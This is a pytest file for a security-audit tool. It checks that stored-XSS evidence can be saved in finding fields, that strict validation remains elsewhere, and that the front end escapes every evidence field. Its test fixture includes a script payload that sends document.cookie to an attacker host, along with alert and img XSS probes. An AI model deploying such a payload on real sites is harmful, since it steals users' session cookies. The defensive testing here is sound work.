# -*- coding: utf-8 -*-
"""A finding whose evidence is markup must still be editable -- and stay safe.

    pytest tests/test_finding_markup.py -v

WHY THIS EXISTS

Saving a stored-XSS finding from the Modify dialog answered:

    The finding was not saved: Value error, Evidence Snippet may not contain
    HTML tags or control characters.

text_validation.clean_safe_text() rejected any "<" or ">" in every long field of
UpdateFindingRequest. For a security-audit tool that is backwards: the proof of a
stored XSS IS "<script>...</script>", an HTTP response is HTML, and a correct XSS
remediation names the tag it is about. The Modify dialog sends every field back,
so once a finding's evidence held markup it could not be edited at all -- not
even to change its status.

The validator exists as defence in depth against stored XSS in the app itself,
and the second layer it relies on is escaping on render. So the change is only
safe if every field it relaxes is escaped wherever the UI draws it. Checking that
turned up two that were not: policy_present and evidence_present were written
into the page raw, and only the validator had been keeping markup out of them.
Relaxing all the long fields at once would have made that an exploitable stored
XSS. Those two are now escaped, and stay strict besides, because they hold a
value picked from a dropdown and never legitimately contain markup.

So: markup is accepted only in fields that quote evidence; control characters
are still refused everywhere (Postgres rejects NUL); the dropdown, filename and
status fields keep the old rule; and a test fails if any evidence field is ever
rendered without escaping.
"""
import io
import os
import re

import pytest
from pydantic import ValidationError

from src.api.endpoints.audit import UpdateFindingRequest
from src.core.text_validation import clean_safe_text


APP_JS = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                      "src", "api", "static", "app.js")

XSS_EVIDENCE = (
    "Target Host: Web Application Endpoint\nScanner:     Burp Suite / Visual OCR\n"
    "Plugin Output:\nPOST /user/profile/update HTTP/1.1\n"
    '"bio": "<script>fetch(\'http://attacker.com/steal?c=\'+document.cookie)</script>"'
)

# What the Modify dialog actually sends: every field, pre-filled.
DIALOG = dict(
    status="Non-Compliant", policy_present="NOT_FOUND", evidence_present="FOUND",
    severity="P2 High", description="Stored XSS in the bio field.",
    source_files="shot_burp_xss.png", evidence_snippet=XSS_EVIDENCE,
    recommendation="Encode <script> output in the bio field and add a CSP.",
    reasoning="Stored XSS in the bio field.", custom_heading=None,
)


def _req(**over):
    return UpdateFindingRequest(**dict(DIALOG, **over))


# ── the reported failure ─────────────────────────────────────────────────────

def test_the_modify_dialog_can_save_a_finding_whose_evidence_is_markup():
    req = _req()
    assert "<script>" in req.evidence_snippet, "the evidence was altered on the way in"


@pytest.mark.parametrize("field", [
    "description", "evidence_snippet", "recommendation", "reasoning", "comment",
    "policy_finding", "policy_gap", "evidence_finding", "evidence_gap",
    "final_reason", "custom_heading",
])
def test_every_evidence_field_accepts_markup(field):
    assert getattr(_req(**{field: "quotes <script>alert(1)</script> verbatim"}), field)


def test_newlines_and_tabs_are_still_allowed():
    assert _req(evidence_snippet="line one\n\tline two\r\n").evidence_snippet


# ── what must stay refused ───────────────────────────────────────────────────

@pytest.mark.parametrize("bad", ["abc\x00def", "abc\x07def", "abc\x1bdef"])
def test_control_characters_are_still_refused_in_evidence(bad):
    """Postgres rejects NUL outright; the rest have no place in text."""
    with pytest.raises(ValidationError):
        _req(evidence_snippet=bad)


@pytest.mark.parametrize("field,value", [
    ("policy_present", "<b>x</b>"),
    ("evidence_present", "<img src=x>"),
    ("source_files", "<script>.png"),
    ("status", "<script>"),
    ("severity", "<b>High</b>"),
])
def test_dropdown_filename_and_status_fields_keep_the_strict_rule(field, value):
    with pytest.raises(ValidationError):
        _req(**{field: value})


def test_the_shared_validator_defaults_to_the_old_rule():
    """Other request models call clean_safe_text too; none of them changes."""
    with pytest.raises(ValueError):
        clean_safe_text("<b>x</b>", "Field", 100)
    assert clean_safe_text("<b>x</b>", "Field", 100, allow_markup=True) == "<b>x</b>"
    with pytest.raises(ValueError):
        clean_safe_text("a\x00b", "Field", 100, allow_markup=True)


# ── what makes accepting markup safe ─────────────────────────────────────────

_RENDERED_FIELDS = (
    "description", "evidence_snippet", "recommendation", "reasoning",
    "policy_finding", "policy_gap", "evidence_finding", "evidence_gap",
    "final_reason", "custom_heading", "review_note",
    "policy_present", "evidence_present",
)


def test_no_evidence_field_is_rendered_without_escaping():
    """Every ${...} that draws one of these fields must go through escapeHtml.

    The validator is the second layer; this is the first. It is what found
    policy_present and evidence_present written into the page raw.
    """
    src = io.open(APP_JS, encoding="utf-8").read()
    raw = []
    for m in re.finditer(r"\$\{([^}]*)\}", src):
        expr = m.group(1)
        if not any(re.search(r"\b%s\b" % f, expr) for f in _RENDERED_FIELDS):
            continue
        if "escapeHtml(" in expr or "csvSafeCell(" in expr:
            continue
        line = src.count("\n", 0, m.start()) + 1
        raw.append("app.js:%d  ${%s}" % (line, expr.strip()[:70]))
    assert not raw, (
        "evidence fields drawn into the page without escapeHtml -- now that they "
        "accept markup, each of these is a stored XSS:\n  " + "\n  ".join(raw))


def test_policy_and_evidence_presence_are_escaped():
    src = io.open(APP_JS, encoding="utf-8").read()
    assert "Policy: ${escapeHtml(f.policy_present)}" in src
    assert "Evidence: ${escapeHtml(f.evidence_present)}" in src


# ── end to end, over HTTP, as the browser sends it ───────────────────────────

def test_the_save_succeeds_over_http_and_stores_the_evidence_intact(tmp_path, monkeypatch):
    """The reported error came back as an HTTP validation response, so the
    check goes through the same layer: FastAPI's request validation, then the
    endpoint, then the database."""
    from fastapi import FastAPI
    from fastapi.testclient import TestClient
    from sqlalchemy import create_engine
    from sqlalchemy.orm import sessionmaker

    import src.api.endpoints.audit as audit_ep
    from src.db.database import AuditReport, Base, Finding

    eng = create_engine("sqlite:///" + str(tmp_path / "m.db"))
    Base.metadata.create_all(eng)
    S = sessionmaker(bind=eng)
    s = S()
    rep = AuditReport(session_id="s1", session_title="s1", framework="VAPT")
    s.add(rep)
    s.flush()
    f = Finding(report_id=rep.id, control_id="VAPT-4",
                control_name="Visual PoC: Stored Cross-Site Scripting",
                status="Non-Compliant", final_result="NON_COMPLIANT",
                severity="P2 High", description="d", evidence_snippet="e",
                recommendation="r")
    s.add(f)
    s.commit()
    fid = f.id
    s.close()

    monkeypatch.setattr(audit_ep, "SessionLocal", S)
    monkeypatch.setattr(audit_ep, "_require_auth", lambda _r: {"username": "a", "role": "admin"})
    monkeypatch.setattr(audit_ep, "_assert_session_access", lambda *a, **k: None)
    monkeypatch.setattr(audit_ep, "log_system_event", lambda *a, **k: None)

    app = FastAPI()
    app.include_router(audit_ep.router, prefix="/api")
    body = dict(DIALOG)
    body.pop("custom_heading")
    r = TestClient(app).put("/api/audit/findings/%d" % fid, json=body)
    assert r.status_code == 200, (r.status_code, r.text[:300])
    assert r.json().get("success") is True

    s = S()
    try:
        stored = s.query(Finding).filter(Finding.id == fid).first().evidence_snippet
    finally:
        s.close()
    assert stored == XSS_EVIDENCE, "the evidence was changed on its way to the database"

    # And the strict rule still bites over HTTP.
    bad = dict(body, policy_present="<b>x</b>")
    assert TestClient(app).put("/api/audit/findings/%d" % fid, json=bad).status_code == 422
